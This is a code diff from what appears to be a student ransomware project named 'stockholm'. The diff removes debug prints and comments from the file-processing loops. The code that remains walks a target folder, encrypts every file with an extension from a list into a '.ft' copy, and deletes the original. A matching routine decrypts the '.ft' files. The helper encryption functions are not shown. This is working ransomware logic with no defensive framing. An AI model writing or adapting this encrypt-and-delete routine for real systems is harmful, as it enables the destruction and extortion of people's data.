@@ -103,15 +103,11 @@ def decrypt_file(file_to_decrypt: str, new_file:str ,key: bytes, nonce:bytes):
 
 def stockholm(key: bytes, nonce:bytes ,s: bool):
     extentions = get_extentions("extensions.txt")
-    # files = get_files(infection_dir)
     for root, subdirs, files in os.walk(TARGET_FOLDER):
             for file in files:
                 try:
                     if extentions[file.split('.')[-1]] and file.split('.')[-1] != "ft":
-                        print(f"File TO Encrypt {file}")
-                        # print(f"FILE {os.path.join(root,file)}")
                         encrypt_file(os.path.join(root, file), os.path.join(root, file + ".ft"), key, nonce)
-                        # write_content_file(os.path.join(root, file + ".ft"), )
                         remove_file(os.path.join(root, file))
                     if s is True:
                         print(f"Encrypted file {file}")
@@ -124,10 +120,8 @@ def reverse_stockholm(key: bytes, nonce: bytes):
             for file in files:
                 try:
                     if file.split('.')[-1] == "ft":
-                        print(f"File TO decrypt {file}")
                         file_path, ext = os.path.splitext(os.path.join(root, file))
                         decrypt_file(os.path.join(root, file),file_path ,key, nonce)
-                        # write_content_file(file_path, decrypt_file(os.path.join(root, file), key))
                         remove_file(os.path.join(root, file))
                 except Exception as e:
                     print(f"Failed for {e}")
